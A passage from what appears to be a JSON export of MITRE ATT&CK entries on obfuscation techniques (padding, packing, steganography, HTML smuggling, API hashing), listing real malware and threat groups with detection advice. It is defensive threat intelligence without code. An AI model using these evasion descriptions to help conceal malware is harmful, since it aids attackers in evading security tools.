      "COATHANGERcan store obfuscated configuration information in the last 56 bytes of the file/date/.bd.key/preload.so.[45]",
      "Cobalt Strikecan hash functions to obfuscate calls to the Windows API and use a public/private key pair to encrypt Beacon session metadata.[46][47]",
      "CoinTickerinitially downloads a hidden encoded file.[48]",
      "Comnieuses RC4 and Base64 to obfuscate strings.[49]",
      "ComRAThas encrypted its virtual file system using AES-256 in XTS mode.[50][51]",
      "Confickerhas obfuscated its code to prevent its removal from host machines.[52]",
      "Contican use compiler-based obfuscation for its code, encrypt DLLs, and hide Windows API calls.[53][54][55]",
      "CORESHELLobfuscates strings using a custom stream cipher.[56]",
      "Cubahas used multiple layers of obfuscation to avoid analysis, including its Base64 encoded payload.[57]",
      "DarkGateuses a hard-coded string as a seed, along with the victim machine hardware identifier and input text, to generate a unique string used as an internal mutex value to evade static detection based on mutexes.[58]",
      "DarkTortillahas been obfuscated with the DeepSea .NET and ConfuserEx code obfuscators.[59]",
      "Daserfuses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.[60]",
      "Denisobfuscates its code and encrypts the API names.[61]",
      "Diavolhas Base64 encoded the RSA public key used for encrypting files.[62]",
      "DRATzaruscan be partly encrypted with XOR.[63]",
      "Dridex's strings are obfuscated using RC4.[64]",
      "Drovorubhas used XOR encrypted payloads in WebSocket client to server messages.[65]",
      "TheDustySkydropper uses a function to obfuscate the name of functions and other parts of the malware.[66]",
      "Earth Luscaused Base64 to encode strings.[67]",
      "Eburyhas obfuscated its strings with a simple XOR encryption with a static key.[68]",
      "ECCENTRICBANDWAGONhas encrypted strings with RC4.[69]",
      "Ecipekaccan use XOR, AES, and DES to encrypt loader shellcode.[70]",
      "EKANSuses encoded strings in its process kill list.[71]",
      "Epicheavily obfuscates its code to make analysis more difficult.[72]",
      "FatDukecan use base64 encoding, string stacking, and opaque predicates for obfuscation.[73]",
      "Final1stspyobfuscates strings with base64 encoding.[74]",
      "FinFisheris heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.[75][76]",
      "Flagprohas been delivered within ZIP or RAR password-protected archived files.[77]",
      "GALLIUMused a modified version ofHTRANin which they obfuscated strings such as debug messages in an apparent attempt to evade detection.[78]",
      "Gallmakerobfuscated shellcode used during execution.[79]",
      "Gamaredon Grouphas delivered self-extracting 7z archive files within malicious document attachments.[80]",
      "TheGootloaderfirst stage script is obfuscated using random alpha numeric strings.[81][82]",
      "Green Lamberthas encrypted strings.[83][84]",
      "GrimAgenthas used Rotate on Right (RoR) and Rotate on Left (RoL) functionality to encrypt strings.[85]",
      "H1N1uses multiple techniques to obfuscate strings, including XOR.[86]",
      "Hancitorhas used Base64 to encode malicious links.[87]",
      "HTTPBrowser's code may be obfuscated through structured exception handling and return-oriented programming.[88]",
      "Hydraquses basic obfuscation in the form of spaghetti code.[89][90]",
      "Imminent Monitorhas encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2.[17]",
      "Industroyeruses heavily obfuscated code in its Windows Notepad backdoor.[7]",
      "InnaputRATuses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.[91]",
      "InvisiMoleavoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format.[92][93]",
      "ISMInjectoris obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.[94]",
      "AJPINuses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.[95]",
      "jRAT’s Java payload is encrypted with AES.[96]Additionally, backdoor files are encrypted using DES as a stream cipher. Later variants ofjRATalso incorporated AV evasion methods such as Java bytecode obfuscation via the commercial Allatori obfuscation tool.[97]",
      "Kazuaris obfuscated using the open source ConfuserEx protector.Kazuaralso obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher.[98]",
      "Ke3changhas used Base64-encoded shellcode strings.[99]",
      "KillDiskuses VMProtect to make reverse engineering the malware more difficult.[100]",
      "Kimsukyhas obfuscated binary strings including the use of XOR encryption and Base64 encoding.[101][102]Kimsukyhas also modified the first byte of DLL implants targeting victims to prevent recognition of the executable file format.[103]",
      "Kobalosencrypts all strings using RC4 and bundles all functionality into a single function call.[104]",
      "Lokibothas obfuscated strings with base64 encoding.[105]",
      "Lumma Stealerhas used SmartAssembly to obfuscate .NET payloads.[106]",
      "Matryoshkaobfuscates API function names using a substitute cipher combined with Base64 encoding.[107]",
      "Mazehas decrypted strings and other important information during the encryption process.Mazealso calls certain functions dynamically to hinder analysis.[108]",
      "MCMDcan Base64 encode output strings prior to sending to C2.[109]",
      "MiniDukecan use control flow flattening to obscure code.[73]",
      "Moonstone Sleetdelivers encrypted payloads in pieces that are then combined together to form a new portable executable (PE) file during installation.[110]",
      "Mustang Pandahas delivered initial payloads hidden using archives and encoding measures.[111][112][113][114][115][116]",
      "NanoCore’s plugins were obfuscated with Eazfuscater.NET 3.3.[117]",
      "NETWIREhas used a custom obfuscation algorithm to hide strings including Registry keys, APIs, and DLL names.[118]",
      "NightClubcan obfuscate strings using the congruential generator(LCG): staten+1 = (690069 × staten + 1) mod 232.[119]",
      "NOKKIuses Base64 encoding for strings.[120]",
      "OLDBAITobfuscates internal strings and unpacks them at startup.[56]",
      "OopsIEuses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2.OopsIEalso encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.[121][122]",
      "SomeOrzstrings are base64 encoded, such as the embedded DLL known as MockDll.[123]",
      "Out1has the ability to encode data.[124]",
      "P.A.S. Webshellcan use encryption and base64 encoding to hide strings and to enforce access control once deployed.[125]",
      "Pillowminthas obfuscated the AES key used for encryption.[126]",
      "Pisloaderobfuscates files by splitting strings into smaller sub-strings and including \"garbage\" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.[127]",
      "PlugXcan use API hashing and modify the names of strings to evade detection.[44][116]",
      "PoetRAThas used a custom encryption scheme for communication between scripts.[128]",
      "PoisonIvyhides any strings related to its own indicators of compromise.[129]",
      "PolyglotDukecan custom encrypt strings.[73]",
      "POSHSPYappends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.[130]",
      "PowerStallionuses a XOR cipher to encrypt command output written to its OneDrive C2 server.[131]",
      "PUNCHBUGGYhas hashed most its code's functions and encrypted payloads with base64 and XOR.[132]",
      "PUNCHTRACKis loaded and executed by a highly obfuscated launcher.[133]",
      "QakBothas hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells.[134]",
      "Ramsayhas base64-encoded its portable executable and hidden itself under a JPG header.Ramsaycan also embed information within document footers.[135]",
      "Raspberry Robinuses mixed-case letters for filenames and commands to evade detection.[136]",
      "RedCurlhas used malware with string encryption.[137]RedCurlhas also encrypted data and has encoded PowerShell commands using Base64.[138][139]RedCurlhas usedPyArmorto obfuscate code execution ofLaZagne.[138]Additionally,RedCurlhas obfuscated downloaded files by renaming them as commonly used tools and has usedecho, instead of file names themselves, to execute files.[140]",
      "RegDukecan use control-flow flattening or the commercially available .NET Reactor for obfuscation.[73]",
      "Remcosuses RC4 and base64 to obfuscate data, including Registry entries and file paths.[141]",
      "Rockehas modified UPX headers after packing files to break unpackers.[142]",
      "ROKRATcan encrypt data prior to exfiltration by using an RSA public key.[21][143]",
      "RTMstrings, network data, configuration, and modules are encrypted with a modified RC4 algorithm.[144][145]",
      "Ryukcan use anti-disassembly and code transformation obfuscation techniques.[55]",
      "Saint Bothas been obfuscated to help avoid detection.[146]",
      "Samuraican encrypt the names of requested APIs.[147]",
      "Sandworm Teamhas used Base64 encoding within malware variants.[148]",
      "Sardoniccan use certain ConfuserEx features for obfuscation and can be encoded in a base64 string.[149]",
      "SDBbothas the ability to XOR the strings for its installer component with a hardcoded 128 byte key.[150]",
      "ShadowPadhas encrypted its payload, a virtual file system, and various files.[151][67]",
      "Shamooncontains base64-encoded strings.[152]",
      "ShimRatReporterencrypted gathered information with a combination of shifting and XOR using a static key.[153]",
      "SHOTPUTis obscured using XOR encoding and appended to a valid GIF file.[154][155]",
      "Siloscapeitself is obfuscated and uses obfuscated API calls.[156]",
      "Sliverobfuscates configuration and other static files using native Go libraries such asgarbleandgobfuscateto inhibit configuration analysis and static detection.[157]",
      "SLOWPULSEcan hide malicious code in the padding regions between legitimate functions in the Pulse Securelibdsplibs.sofile.[158]",
      "Small Sievehas the ability to use a custom hex byte swapping encoding scheme combined with an obfuscated Base64 function to protect program strings and Telegram credentials.[159]",
      "Snip3has the ability to obfuscate strings using XOR encryption.[160]",
      "SodaMastercan use \"stackstrings\" for obfuscation.[70]",
      "SombRATcan encrypt strings with XOR-based routines and use a custom AES storage format for plugins, configuration, C2 domains, and harvested data.[161][162][163]",
      "SoreFanghas the ability to encode and RC6 encrypt data sent to C2.[164]",
      "StreamExobfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.[165]",
      "StrelaStealerhas been distributed in ISO archives.[166]StrelaStealerhas been delivered in encrypted, password-protected ZIP archives.[167]",
      "SUNBURSTobfuscated collected system information using a FNV-1a + XOR algorithm.[168]",
      "SUNSPOTencrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs forSUNBURSTsource code and data extracted from the SolarWinds Orion <MsBuild.exeprocess.[169]",
      "SVCReadycan encrypt victim data with an RC4 cipher.[170]",
      "SynAckpayloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering.[171][172]",
      "TajMahalhas used an encrypted Virtual File System to store plugins.[173]",
      "TEARDROPcreated and read from a file with a fake JPG header, and its payload was encrypted with a simple rotating XOR cipher.[168][174][175]",
      "TrickBotuses non-descriptive names to hide functionality.[176]",
      "Trojan.Karaganycan base64 encode and AES-128-CBC encrypt data prior to transmission.[177]",
      "Turiancan use VMProtect for obfuscation.[25]",
      "Valakhas the ability to base64 encode and XOR encrypt strings.[178][179][180]",
      "Windshifthas used string encoding with floating point calculations.[181]",
      "A version ofXTunnelintroduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.[182]"
    ]
  },
  "T1027.001": {
    "Name": "Obfuscated Files or Information:Binary Padding",
    "Description": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.[1]The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.[2]Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.[3]",
    "Detects": [
      "Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool. When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file."
    ],
    "Procedure Examples": [
      "Akirahas used binary padding to obfuscate payloads.[4]",
      "APT29used large size files to avoid detection by security solutions with hardcoded size limits.[5]",
      "Bisonalhas appended random binary data to the end of itself to generate a large binary.[6]",
      "Black Bastahad added data prior to the Portable Executable (PE) header to prevent automatic scanners from identifying the payload.[7]",
      "BRONZE BUTLERdownloader code has included \"0\" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.[8][9]",
      "TheCHIMNEYSWEEPinstaller has been padded with null bytes to inflate its size.[10]",
      "Comnieappends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.[11]",
      "CostaBrickshas added the entire unobfuscated code of the legitimate open source application Blink to its code.[12]",
      "A variant ofEmissaryappends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.[13]",
      "Emotetinflates malicious files and malware as an evasion technique.[14]",
      "Goopyhas had null characters padded in its malicious DLL payload.[15]",
      "Grandoreirohas added BMP images to the resources section of its Portable Executable (PE) file increasing each binary to at least 300MB in size.[16]",
      "GrimAgenthas the ability to add bytes to change the file hash.[17]",
      "Higaisaperformed padding with null bytes before calculating its hash.[18]",
      "Javalican use large obfuscated libraries to hinder detection and analysis.[19]",
      "Before writing to disk,Kwampirsinserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.[20]",
      "Latrodectushas been obfuscated with a 129 byte sequence of junk data prepended to the file.[21]",
      "Leviathanhas inserted garbage characters into code, presumably to avoid anti-virus detection.[22]",
      "LightSpy's configuration file is appended to the end of the binary. For example, the last0x1d0bytes of one sample is an AES encrypted configuration file with a static key of3e2717e8b3873b29.[23]",
      "Moafeehas been known to employ binary padding.[24]",
      "Patchworkapparently alteredNDiskMonitorsamples by adding four bytes of random letters in a likely attempt to change the file hashes.[25]",
      "QakBotcan use large file sizes to evade detection.[26][27]",
      "Rifdoorhas added four additional bytes of data upon launching, then saved the changed version asC:\\ProgramData\\Initech\\Initech.exe.[28]",
      "Snip3can obfuscate strings using junk Chinese characters.[29]",
      "TAINTEDSCRIBEcan executeFileRecvWriteRandto append random bytes to the end of a file received from C2.[30]"
    ]
  },
  "T1027.002": {
    "Name": "Obfuscated Files or Information:Software Packing",
    "Description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.[1]Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.[2]",
    "Detects": [
      "Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code."
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamused UPX to pack a copy ofMimikatz.[3]",
      "Anchorhas come with a packed payload.[4]",
      "Aoqin Dragonhas used the Themida packer to obfuscate malicious payloads.[5]",
      "AppleSeedhas used UPX packers for its payload DLL.[6]",
      "APT29used UPX to pack files.[7]",
      "APT3has been known to pack their tools.[8][9]",
      "APT38has used several code packing methods such as Themida, Enigma, VMProtect, and Obsidium, to pack their implants.[10]",
      "APT39has packed tools with UPX, and has repacked a modified version ofMimikatzto thwart anti-virus detection.[11][12]",
      "APT41uses packers such as Themida to obfuscate malicious files.[13]",
      "Astarothuses a software packer called Pe123\\RPolyCryptor.[14]",
      "Versions ofBabukhave been packed.[15][16][17]",
      "Bazarhas a variant with a packed payload.[18][19]",
      "Bisonalhas used the MPRESS packer and similar tools for obfuscation.[20]",
      "BLINDINGCANhas been packed with the UPX packer.[21]",
      "DuringC0017,APT41used VMProtect to slow the reverse engineering of malicious binaries.[22]",
      "China Chopper's client component is packed with UPX.[23]",
      "Clophas been packed to help avoid detection.[24][25]",
      "The first stage ofCOATHANGERis delivered as a packed file.[26]",
      "CostaBrickscan implement a custom-built virtual machine mechanism to obfuscate its code.[27]",
      "CSPY Downloaderhas been packed with UPX.[28]",
      "Cubahas a packed payload when delivered.[29]",
      "Dark Caracalhas used UPX to packBandook.[30]",
      "DarkComethas the option to compress its payload using UPX or MPRESS.[31]",
      "A version ofDaserfuses the MPRESS packer.[32]",
      "Dokis packed with an UPX executable packer.[33]",
      "Donutcan generate packed code modules.[34]",
      "DRATzarus's dropper can be packed with UPX.[35]",
      "Dyrehas been delivered with encrypted resources and must be unpacked for execution.[36]",
      "Egregor's payloads are custom-packed, archived and encrypted to prevent analysis.[37][38]",
      "Elderwoodhas packed malware payloads before delivery to victims.[39]",
      "Emotethas used custom packers to protect its payloads.[40]",
      "FatDukehas been regularly repacked by its operators to create large binaries and evade detection.[41]",
      "AFinFishervariant uses a custom packer.[42][43]",
      "FYAntihas used ConfuserEx to pack its .NET module.[44]",
      "GALLIUMpacked some payloads using different types of packers, both known and custom.[45]",
      "GoldMaxhas been packed for obfuscation.[46]",
      "GreyEnergyis packed for obfuscation.[47]",
      "H1N1uses a custom packing algorithm.[48]",
      "Hildegardhas packed ELF files into other binaries.[49]",
      "HotCroissanthas used the open source UPX executable packer.[50]",
      "HyperBrohas the ability to pack its payload.[51]",
      "IcedIDhas packed and encrypted its loader module.[52]",
      "jRATpayloads have been packed.[53]",
      "Kimsukyhas packed malware with UPX.[6]",
      "KONNIhas been packed for obfuscation.[54]",
      "TheLatrodectuspayload has been packed for obfuscation.[55]",
      "LiteDukehas been packed with multiple layers of encryption.[41]",
      "LockBit 3.0can use code packing to hinder analysis.[56][57]",
      "Lokibothas used several packing methods for obfuscation.[58]",
      "Luciferhas used UPX packed binaries.[59]",
      "Machetehas been packed with NSIS.[60]",
      "Melcozhas been packed with VMProtect and Themida.[61]",
      "Metamorfohas used VMProtect to pack and protect files.[62]",
      "Misdatwas typically packed using UPX.[63]",
      "Mongallhas been packed with Themida.[5]",
      "MoustachedBouncerhas used malware plugins packed with Themida.[64]",
      "NETWIREhas used .NET packer tools to evade detection.[65]",
      "DuringNight Dragon, threat actors used software packing in its tools.[66]",
      "OopsIEuses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.[67]",
      "DuringOperation Dream Job,Lazarus Grouppacked malicious .db files with Themida to evade detection.[35][68][69]",
      "ForOperation Dust Storm, the threat actors used UPX to pack some payloads.[63]",
      "ForOperation Spalax, the threat actors used a variety of packers, including CyaX, to obfuscate malicious executables.[70]",
      "OSX_OCEANLOTUS.Dhas a variant that is packed with UPX.[71]",
      "APatchworkpayload was packed with UPX.[72]",
      "QakBotcan encrypt and pack malicious payloads.[73]",
      "Raindropused a custom packer for itsCobalt Strikepayload, which was compressed using the LZMA algorithm.[74][75]",
      "Raspberry Robincontains multiple payloads that are packed for defense evasion purposes and unpacked on runtime.[76]",
      "Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.[77][78][79]",
      "SomeS-Typesamples have been packed with UPX.[63]",
      "Sagerunexhas used VMProtect to pack and obscure itself.[80]",
      "Saint Bearclones .NET assemblies from other .NET binaries as well as cloning code signing certificates from other software to obfuscate the initial loader payload.[81]",
      "Saint Bothas been packed using a dark market crypter.[82]",
      "SDBbothas used a packed installer file.[83]",
      "SeaDukehas been packed with the UPX packer.[84]",
      "ShimRat's loader has been packed with the compressedShimRatcore DLL and the legitimate DLL for it to hijack.[85]",
      "Sparkhas been packed with Enigma Protector to obfuscate its contents.[86]",
      "Squirrelwafflehas been packed with a custom packer to hide payloads.[87][88]",
      "StrelaStealervariants have used packers to obfuscate payloads and make analysis more difficult.[89]",
      "SysUpdatehas been packed with VMProtect.[51][90]",
      "TA2541has used a .NET packer to obfuscate malicious files.[91]",
      "TA505has used UPX to obscure malicious code.[83]",
      "TeamTNThas used UPX and Ezuri packer to pack its binaries.[92]",
      "The White Companyhas obfuscated their payloads through packing.[93]",
      "Threat Group-3390has packed malware and tools, including using VMProtect.[94][51]",
      "Tomirishas been packed with UPX.[95]",
      "Torismahas been packed with Iz4 compression.[69]",
      "TrickBotleverages a custom packer to obfuscate its functionality.[96]",
      "Trojan.Karaganysamples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.[97][98]",
      "Troll Stealerhas been delivered as a VMProtect-packed binary.[99][100]",
      "Uroburosuses a custom packer.[101][102]",
      "Valakhas used packed DLL payloads.[103]",
      "VERMINis initially packed.[104]",
      "Volt Typhoonhas used the Ultimate Packer for Executables (UPX) to obfuscate the FRP client files BrightmetricAgent.exe and SMSvcService.ex) and the port scanning utility ScanLine.[105]",
      "XLoaderuses various packers, including CyaX, to obfuscate malicious executables.[106]",
      "ytypacks a plugin with UPX.[107]",
      "Zebrocy's Delphi variant was packed with UPX.[108][109]",
      "SomeZeroTDLL files have been packed with UPX.[110]",
      "ZIRCONIUMhas used multi-stage packers for exploit code.[111]"
    ]
  },
  "T1027.003": {
    "Name": "Obfuscated Files or Information:Steganography",
    "Description": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.Duquwas an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.[1]By the end of 2017, a threat group usedInvoke-PSImageto hidePowerShellcommands in an image file (.png) and execute the code on a victim's system. In this particular case thePowerShellcode downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.[2]",
    "Detects": [
      "Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings or other signatures left in system artifacts related to decoding steganography."
    ],
    "Procedure Examples": [
      "ABKcan extract a malicious Portable Executable (PE) from a photo.[3]",
      "Andarielhas hidden malicious executables within PNG files.[4][5]",
      "APT37uses steganography to send images to users that are embedded with shellcode.[6][7]",
      "Avengercan extract backdoor malware from downloaded images.[3]",
      "Bandookhas used .PNG images within a zip file to build the executable.[8]",
      "BBKcan extract a malicious Portable Executable (PE) from a photo.[3]",
      "BRONZE BUTLERhas used steganography in multiple operations to conceal malicious payloads.[3]",
      "build_downercan extract malware from a downloaded JPEG.[3]",
      "Diavolhas obfuscated its main code routines within bitmap images as part of its anti-analysis techniques.[9]",
      "Earth Luscahas used steganography to hide shellcode in a BMP image file.[10]",
      "IcedIDhas embedded binaries within RC4 encrypted .png files.[11]",
      "Invoke-PSImagecan be used to embed a PowerShell script within the pixels of a PNG file.[12]",
      "Leviathanhas used steganography to hide stolen data inside other files stored on Github.[13]",
      "LiteDukehas used image files to hide its loader component.[14]",
      "MuddyWaterhas stored obfuscated JavaScript code in an image file named temp.jpg.[15]",
      "ObliqueRATcan hide its payload in BMP images hosted on compromised websites.[16]",
      "Okrum's payload is encrypted and embedded within its loader, or within a legitimate PNG file.[17]",
      "DuringOperation Ghost,APT29used steganography to hide payloads inside valid images.[14]",
      "ForOperation Spalax, the threat actors used packers that read pixel data from images contained in PE files' resource sections and build the next layer of execution from the data.[18]",
      "Pikabotloads a set of PNG images stored in the malware's resources section (RCDATA), each with an encrypted section containing portions of the corePikabotcore module. These sections are loaded and decrypted using a bitwise XOR operation with a hardcoded 32 bit key.[19]",
      "PolyglotDukecan use steganography to hide C2 information in images.[14]",
      "PowerDukeuses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA).[20]",
      "ProLockcan use .jpg and .bmp files to store its payload.[21]",
      "Raindropused steganography to locate the start of its encoded payload within legitimate 7-Zip code.[22]",
      "Ramsayhas PE data embedded within JPEG files contained within Word documents.[23]",
      "RDATcan also embed data within a BMP image prior to exfiltration.[24]",
      "RegDukecan hide data in images, including use of the Least Significant Bit (LSB).[14]",
      "TA551has hidden encoded data for malware DLLs in a PNG.[25]",
      "Tropic Trooperhas used JPG files with encrypted payloads to mask their backdoor routines and evade detection.[26]"
    ]
  },
  "T1027.004": {
    "Name": "Obfuscated Files or Information:Compile After Delivery",
    "Description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe[1], csc.exe, or GCC/MinGW.[2]Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as aPhishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.[3]",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to gather common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.",
      "Monitor for newly constructed files for payloads",
      "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc.",
      "Monitor for newly constructed processes and/or command-lines that look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system. Typically these should only be used in specific and limited cases, like for software development."
    ],
    "Procedure Examples": [
      "Cardinal RATand its watchdog component are compiled and executed after being delivered to victims as embedded, uncompiled source code.[4]",
      "DarkWatchmanhas used thecsc.exetool to compile a C# executable.[5]",
      "FoggyWebcan compile and execute source code sent to the compromised AD FS server via a specific HTTP POST.[6]",
      "Gamaredon Grouphas compiled the source code for a downloader directly on the infected system using the built-inMicrosoft.CSharp.CSharpCodeProviderclass.[7]",
      "MuddyWaterhas used the .NET csc.exe tool to compile executables from downloaded C# code.[2]",
      "njRAThas used AutoIt to compile the payload and main script into a single executable after delivery.[8]",
      "Rockehas compiled malware, delivered to victims as .c files, with the GNU Compiler Collection (GCC).[9]",
      "Samuraican compile and execute downloaded modules at runtime.[10]",
      "Sea Turtledownloaded source code files from remote addresses then compiled them locally via GCC in victim environments.[11]",
      "Sliverincludes functionality to retrieve source code and compile locally prior to execution in victim environments.[12]"
    ]
  },
  "T1027.005": {
    "Name": "Obfuscated Files or Information:Indicator Removal from Tools",
    "Description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
    "Detects": [
      "The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network."
    ],
    "Procedure Examples": [
      "APT3has been known to remove indicators of compromise from tools.[1]",
      "Cobalt Strikeincludes a capability to modify the Beacon payload to eliminate known signatures or unpacking methods.[2][3]",
      "Analysis ofDaserfhas shown that it regularly undergoes technical improvements to evade anti-virus detection.[4]",
      "Deep Pandahas updated and modified its malware, resulting in different hash values that evade detection.[5]",
      "GALLIUMensured each payload had a unique hash, including by using different types of packers.[6]",
      "The author ofGravityRATsubmitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document.[7]",
      "InvisiMolehas undergone regular technical improvements in an attempt to evade detection.[8]",
      "OilRighas tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.[9][10]",
      "DuringOperation Wocao, threat actors edited variable names within theImpacketsuite to avoid automated detection.[11]",
      "Patchworkapparently alteredNDiskMonitorsamples by adding four bytes of random letters in a likely attempt to change the file hashes.[12]",
      "Penquincan remove strings from binaries.[13]",
      "PowerSploit'sFind-AVSignatureAntivirusBypass module can be used to locate single byte anti-virus signatures.[14][15]",
      "QakBotcan make small changes to itself in order to change its checksum and hash value.[16][17]",
      "SUNBURSTsource code used generic variable names and pre-obfuscated strings, and was likely sanitized of developer comments before being added toSUNSPOT.[18]",
      "In theTriton Safety Instrumented System Attack,TEMP.Velesmodified files based on the open-source project cryptcat in an apparent attempt to decrease anti-virus detection rates.[19]",
      "Based on comparison ofGazerversions,Turlamade an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.[20]",
      "Waterbearcan scramble functions not to be executed again with random values.[21]"
    ]
  },
  "T1027.006": {
    "Name": "Obfuscated Files or Information:HTML Smuggling",
    "Description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.[1][2]Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such astext/plainand/ortext/html. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e.Deobfuscate/Decode Files or Information), potentially bypassing content filters.For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such asmsSaveBlob.[1][3][2][4]",
    "Detects": [
      "Monitor for newly constructed files via JavaScript, developing rules for the different variants, with a combination of different encoding and/or encryption schemes, may be very challenging. Consider monitoring files downloaded from the Internet, possibly by HTML Smuggling, for suspicious activities. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities."
    ],
    "Procedure Examples": [
      "APT29has embedded an ISO file within an HTML attachment that contained JavaScript code to initiate malware execution.[5]",
      "EnvyScoutcontains JavaScript code that can extract an encoded blob from its HTML body and write it to disk.[6]",
      "QakBothas been delivered in ZIP files via HTML smuggling.[7][8]"
    ]
  },
  "T1027.007": {
    "Name": "Obfuscated Files or Information:Dynamic API Resolution",
    "Description": "Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses variousNative APIfunctions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.[1][2]To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar toSoftware Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such asGetProcAddress()andLoadLibrary(). These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms 